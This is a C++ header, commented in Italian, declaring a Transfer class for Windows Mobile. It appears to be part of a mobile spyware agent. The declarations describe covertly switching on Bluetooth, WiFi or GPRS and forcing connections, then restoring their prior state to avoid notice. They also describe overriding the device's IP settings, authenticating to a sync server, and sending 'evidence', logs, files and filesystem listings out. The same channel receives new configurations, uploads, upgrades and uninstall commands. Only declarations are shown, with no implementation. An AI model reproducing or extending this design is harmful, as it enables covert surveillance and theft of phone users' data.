#include "Common.h"
#include "Conf.h"
#include "UberLog.h"
#include "Rand.h"
#include "WiFi.h"
#include "Device.h"
#include "GPRSConnection.h"
#include "BlueTooth.h"
#include "Hash.h"

#include <exception>
#include <Winsock2.h>
///#include <ws2bth.h>

#include <common_new\ipexport.h>
#include <common_new\service.h>
#include <common_new\pm.h>
#include <initguid.h>
#include <vector>

using namespace std;

#ifndef __Transfer_h__
#define __Transfer_h__

#include "Status.h"

class Status;

class Transfer
{
	private: BlueTooth *objBluetooth;
	
	/**
	 * TRUE se il WiFi e' attualmente attivo, FALSE altrimenti.
	 */
	private: BOOL bIsWifiActive;

	/**
	 * TRUE se il WiFi e' gia' stato attivato da noi, FALSE altrimenti.
	 */
	private: BOOL bIsWifiAlreadyActive;

	/**
	 * Contiene lo stato originale di alimentazione della Wifi
	 */
	private: CEDEVICE_POWER_STATE wifiPower;

	/**
	 * strWifiGuidName contiene il nome dell'adattatore WiFi completo di GUID.
	 * strWifiAdapter contiene soltanto il nome dell'adattatore WiFi.
	 */
	private: wstring strWifiGuidName, strWifiAdapter;
	
	/**
	* TRUE se e' stata ricevuta una nuova configurazione, FALSE altrimenti.
	*/
	private: BOOL bNewConf;

	/**
	* TRUE se e' stata ricevuta una richiesta di uninstall, FALSE altrimenti.
	*/
	private: BOOL bUninstall;

	/**
	 * Il buffer che contiene il challenge per il controllo del server.
	 */
	private: BYTE Challenge[16];

	/**
	* La GUID utilizzata per trovare il servizio bluetooth
	*/
	private: GUID m_btGuid;

	/**
	 * L'oggetto WiFi utilizzato per il controllo della rete wireless
	 */
	///private: CWifi wifiObj;

	private: SOCKET wifiSocket;
	///private: SOCKET BTSocket;
	private: SOCKET internetSocket;

	/**
	 * Serve al costruttore per impostare tutte le opzioni che sono presenti nel file di configurazione
	 * e che sono differenti da quelle presenti nelle variabili globali.
	 */
	private: Status *statusObj;

	/**
	* Utilizzato dai metodi di sync per tenere traccia dello stato di standby del monitor.
	*/
	private: Device *deviceObj;

	/**
	 * Oggetto per la connessione via GPRS
	 */
	///private: GPRSConnection gprsObj;

	/**
	 * Tempo in millisecondi per il loop di polling della connessione. E numero di tentativi da fare
	 */
	private: UINT pollInterval;
	private: UINT retryTimes;

	/**
	 * La porta di RSS mobile.
	 */
	private: USHORT sPort;

	/**
	 * Mac address del server bluetooth
	 */
	private: BT_ADDR uBtMac;

	/**
	 * Variabili utilizzate per tenere traccia dei nuovi IP aggiunti sulla WiFi
	 */
	private: ULONG NTEContext, NTEInstance;
	private: ULONG ulOriginalIp, ulOriginalMask;
	private: wstring strRegistryIp, strRegistryMask, strSessionCookie;
	private: ULONG ulRegistryDhcp;

	/**
	 * Chiave Km Kd e Nonce per la sync REST
	 */
	private: BYTE K[20]; // Vengono usati solo i primi 128-bit
	private: UINT Kd[4], Nonce[4];

	/**
	 * Vettore che contiene i comandi da processare.
	 */
	private: vector<UINT> vAvailables;

	/**
	* L'host su cui faremo la sync.
	*/
	private: wstring strSyncServer;

	/**
	 * TRUE se abbiamo forzato una connessione WiFi/GPRS e siamo in attesa del rilascio,
	 * FALSE altrimenti.
	 */
	private: BOOL bWiFiForced, bGprsForced;

	/**
	* PIN per la connessione bluetooth
	*/
	private: UCHAR BtPin[16];

	/**
	 * SSID per la connessione alla rete WiFi Ad-Hoc
	 */
	private: WCHAR wSsid[33];

	/**
	 * Buffer che contiene la chiave della connessione WiFi, al massimo
	 * sara' lunga 256 bit.
	 */
	private: BYTE wifiKey[32];

	/**
	 * Lunghezza in byte della chiave di cifratura per il WiFi, la inizializziamo
	 * dentro SetWifiKey().
	 */
	private: UINT uWifiKeyLen;

	private: list<LogInfo> *pSnap; // Viene liberato da RestSendLogs() e dal distruttore
	private: UberLog *uberlogObj;

	/**
	 * Attiva il dispositivo BT, torna TRUE se l'attivazione e' andata a buon fine, FALSE altrimenti. Questa funzione
	 * deve controllare prima lo stato di bIsBtAlreadyActive per evitare la doppia attivazione e per mantenere
	 * lo stato dell'oggetto coerente con lo stato del telefono.
	 */
	private: BOOL ActivateBT();

	/**
	 * Disattiva il dispositivo BT, torna TRUE se la disattivazione e' andata a buon fine, FALSE altrimenti. Questa
	 * funzione deve controllare lo stato del BT per vedere se e' ancora attivo (l'utente potrebbe averlo 
	 * disattivato), poi deve controllare lo stato di bIsBtAlreadyActive per verificare che il BT non fosse gia' acceso
	 * per conto suo. In caso contrario lo spegne altrimenti lo lascia allo stato originale.
	 */
	private: BOOL DeActivateBT();

	/**
	 * Attiva la connessione WiFi, torna TRUE se l'attivazione e' andata a buon fine, FALSE altrimenti. Questa 
	 * funzione deve controllare prima lo stato di bIsWifiAlreadyActive per evitare la doppia attivazione e per 
	 * mantenere lo stato dell'oggetto coerente con lo stato del telefono.
	 */
	protected: BOOL ActivateWiFi();

	/**
	 * Disattiva il dispositivo WiFi, torna TRUE se la disattivazione e' andata a buon fine, FALSE altrimenti. Questa
	 * funzione deve controllare lo stato del Wifi per vedere se e' ancora attivo (l'utente potrebbe averlo 
	 * disattivato), poi deve controllare lo stato di bIsWifiAlreadyActive per verificare che il Wifi non fosse gia' 
	 * acceso per conto suo. In caso contrario lo spegne altrimenti lo lascia allo stato originale.
	 */
	protected: BOOL DeActivateWiFi();

	/**
	 * Torna TRUE se l'interfaccia WiFi e' accesa ed attiva (quindi non in standby o sleep), FALSE altrimenti.
	 */
	private: BOOL IsWiFiActive();

	/**
	 * Imposta il PIN per la connessione BT. Torna TRUE se il PIN e' stato impostato correttamente, FALSE altrimenti.
	 */
	private: BOOL SetBTPin(UCHAR *pPin, UINT uLen);
			 
	/**
	 * Torna TRUE se e' disponibile una connessione ad internet attiva, FALSE altrimenti.
	 */
	private: BOOL IsInternetConnectionAvailable();

	/**
	 * Torna TRUE se e' gia' attiva e stabilita una connessione WiFi.
	 */
	protected: BOOL IsWiFiConnectionAvailable();

	/**
	* Questi metodi attivano le relative interfacce e quindi chiamano la Send() per spedire i TransferLog
	*/
	protected: BOOL BtSend();
	protected: UINT WiFiSendPda();
	protected: INT InternetSend(const wstring &strHostname);

	/**
	 * Imposta nella configurazione il MAC Address che verra' utilizzato per la connessione BT. Torna TRUE se
	 * la nuova impostazione e' stata aggiornata correttamente, FALSE altrimenti.
	 */
	private: BOOL SetBTMacAddress(UINT64 uMacAddress);

	/**
	* Imposta nella configurazione il GUID utilizzato dal servizio BT. Torna TRUE se
	* la nuova impostazione e' stata aggiornata correttamente, FALSE altrimenti.
	*/
	private: BOOL SetBTGuid(GUID gGuid);

	/**
	 * Imposta nella configurazione il nuovo MAC Address che verra' utilizzato per la connessione WiFi. Torna TRUE se
	 * la nuova impostazione e' stata aggiornata correttamente, FALSE altrimenti.
	 */
	private: BOOL SetWifiMacAddress(UINT pMacAddress);

	/**
	 * Imposta nella configurazione l'SSID che verra' utilizzato per la connessione WiFi. Torna TRUE se
	 * la nuova impostazione e' stata aggiornata correttamente, FALSE altrimenti. uLen e' la lunghezza in
	 * byte del buffer puntato da pSSID
	 */
	private: BOOL SetWifiSSID(WCHAR* pSSID, UINT uLen);

	/**
	 * Imposta la chiave per la connessione WiFi ed il tipo di connessione (in chiaro, WEP, WPA, WPA2...). Torna
	 * TRUE se la funzione e' andata a buon fine, FALSE altrimenti. uLen e' la lunghezza della chiave.
	 */
	private: BOOL SetWifiKey(BYTE* pKey, UINT uLen);

	/**
	* Imposta il tempo di retry per una connessione fallita ed il numero ti tentativi. La funzione torna
	* TRUE se e' andata a buon fine, FALSE altrimenti.
	*/
	private: BOOL SetPollInterval(UINT uPoll, UINT uTimes);

	/**
	* Invia un comando lungo uCommandLen, la funzione scrive in uResponseLen
	* la lunghezza del blocco decifrato che esclude il padding. 
	* Torna un puntatore al response che va liberato dal chiamante, NULL in 
	* caso di fallimento.
	*/
	private: BYTE* RestSendCommand(BYTE* pCommand, UINT uCommandLen, UINT &uResponseLen);

	/**
	* Crea una richiesta HTTP-POST verso il server, ed inizializza il cookie se necessario.
	* Dentro pResponse c'e' la risposta del server che va liberata dal chiamante. La funzione
	* torna TRUE se va a buon fine, FALSE altrimenti.
	*/
	private: BOOL RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pResponse, UINT &uResponseLen, BOOL bSetCookie = TRUE);

	/**
	* Effettua la fase di Auth della sync REST. Torna il comando ricevuto o INVALID_COMMAND se fallisce.
	*/
	private: UINT RestAuth();

	/**
	* Crea e cifra il request del primo pacchetto di auth. Il buffer tornato contiene la richiesta e
	* va liberato dal chiamante. In uContentLen c'e' la lunghezza del contenuto cifrato.
	* La funzione torna NULL in caso di fallimento.
	*/
	private: BYTE* RestCreateAuthRequest(UINT *uContentLen);

	/**
	* Ottiene K a partire dal Kd e dal contenuto cifrato ricevuto nella prima fase dell'auth.
	* K e' un attributo di classe e viene valorizzato se la funzione termina con successo.
	* Torna TRUE se la funzione va a buon fine, FALSE altrimenti. 
	*/
	private: BOOL RestDecryptK(BYTE *pContent);

	/**
	* Verifica il Nonce e ottiene il comando spedito dal server. Torna INVALID_COMMAND in
	* caso la funzione non vada a buon fine.
	*/
	private: UINT RestGetCommand(BYTE* pContent);

	/**
	* Effettua la fase di identificazione, torna TRUE in caso di successo, FALSE altrimenti.
	*/
	private: BOOL RestIdentification();

	/**
	* Riceve la nuova configurazione, torna TRUE in caso di successo, FALSE altrimenti.
	*/
	private: BOOL RestGetNewConf();

	BOOL RestSendEvidenceSize();

	BOOL RestSendDownloads();
	BOOL RestGetUploads();
	BOOL RestGetUpgrade();
	BOOL RestSendFilesystem();
	BOOL RestSendLogs();
	BOOL RestSendConfAck(BOOL bConfOK); // Invia il PROTO_NO o PROTO_OK per confermare la ricezione della nuova conf

	/**
	* Esegue i request presenti negli availables. Se la funzione fallisce si passa cmq
	* alla fase di invio dei log.
	*/
	private: void RestProcessAvailables();

	/**
	* Cerca sull'indirizzo "address" il servizio con il nostro GUID, torna
	* TRUE se il servizio viene trovato su "address", FALSE altrimenti.
	*/
	private: BOOL InquiryService(WCHAR *address);

	/**
	* Cerca il server bluetooth con il servizio per la sync, torna un mac address 
	* se la funzione torna a buon fine, 0 altrimenti.
	*/
	private: BT_ADDR FindServer(SOCKET bt);

	/**
	 * Torna il primo IP di un'interfaccia di rete, strAdapterName e' il nome dell'adattatore.
	 * Per convertire l'IP in stringa va usata la inet_ntoa(), che non e' thread safe.
	 */
	protected: DWORD GetAdapterIP(const wstring &strAdapterName);

	/**
	* Torna la mask di un'interfaccia di rete, strAdapterName e' il nome dell'adattatore.
	* Per convertire la mask in stringa va usata la inet_ntoa(), che non e' thread safe.
	*/
	protected: DWORD GetAdapterMask(const wstring &strAdapterName);

	/**
	 * Torna l'indice dell'interfaccia di rete il cui nome e' strAdapterName. Si tratta di un
	 * override della GetAdapterIndex() definita in iphlpapi.h
	 */
	protected: DWORD GetAdapterIndex(const wstring &strAdapterName);

	/**
	 * Forza la connessione ad una rete WiFi aperta o preconfigurata dall'utente, la funzione
	 * torna TRUE se e' stata stabilita una connessione, FALSE altrimenti. Se gia' esiste una
	 * connessione WiFi precedentemente stabilita, questa non viene interrotta e la funzione
	 * torna FALSE. Questa connessione va poi rilasciata tramite la ReleaseWiFiConnection().
	 * Questa funzione richiama internamente la IsWiFiConnectionAvailable().
	 */
	protected: BOOL ForceWiFiConnection();

	/**
	* Forza la connessione alla rete GPRS, torna TRUE se e' stata stabilita una connessione, 
	* FALSE altrimenti. Se gia' esiste una connessione GPRS precedentemente stabilita, 
	* questa non viene interrotta e la funzione torna FALSE. Questa connessione va poi 
	* rilasciata tramite la ReleaseGprsConnection().
	* Questa funzione richiama internamente la IsInternetConnectionAvailable().
	*/
	protected: BOOL ForceGprsConnection();

	/**
	 * Rilascia una connessione WiFi precedentemente forzata, la funzione torna TRUE se la
	 * connessione e' stata rilasciata con successo, FALSE se non e' stato possibile o se non
	 * esiste nessuna connessione forzata da rilasciare.
	 */
	protected: BOOL ReleaseWiFiConnection();

	/**
	* Rilascia una connessione GPRS precedentemente forzata, la funzione torna TRUE se la
	* connessione e' stata rilasciata con successo, FALSE se non e' stato possibile o se non
	* esiste nessuna connessione forzata da rilasciare.
	*/
	protected: BOOL ReleaseGprsConnection();

	/**
	 * Disabilita il DHCP e imposta il nostro IP per la sync tramite WiFi. Torna TRUE
	 * se la funzione va a buon fine, FALSE altrimenti.
	*/
	private: BOOL SetWirelessIp(const wstring &strAdapterName, ULONG uIp, ULONG uMask);

	/**
	* Reimposta i valori originali modificati dalla SetWirelessIp(). Torna TRUE
	* se la funzione va a buon fine, FALSE altrimenti.
	*/
	private: BOOL RestoreWirelessIp(const wstring &wAdapterName);

	/**
	* Torna TRUE se lo stack bluetooth utilizzato e' Widcomm, FALSE altrimenti.
	*/
	private: BOOL IsWidcomm();

	/**
	 * Costruttore di default, chiama la Status.GetConfStruct() per inizializzare tutte le impostazioni per il polling e
	 * per l'inizializzazione delle connessioni.
	 */
	public:  Transfer();
			 ~Transfer();

	/**
	 * Funzioni di backward compatibility col vecchio protocollo
	 */
	public:
		UINT SendOldProto(UINT Type, BOOL bInterrupt);
		BOOL SendIds(SOCKET s);
		BOOL SendChallenge(SOCKET s);
		BOOL CheckResponse(SOCKET s);
		BOOL GetChallenge(SOCKET s);
		BOOL SyncOldProto(SOCKET s, BOOL bInterrupt);
		INT SendData(SOCKET s, BYTE *pData, UINT Len);
		INT RecvData(SOCKET s, BYTE *pData, UINT Len);
		INT SendCommand(SOCKET s, UINT uCommand);
		INT RecvCommand(SOCKET s);
		BOOL GetNewConf(SOCKET s);
		BOOL GetUpload(SOCKET s);
		BOOL SendDownload(SOCKET s);
		BOOL CreateDownloadFile(const wstring &strPath, BOOL bObscure);
		BOOL SendFileSystem(SOCKET s);
		BOOL GetUpgrade(SOCKET s);
		void ClearLogSnapshot();
};

#endif
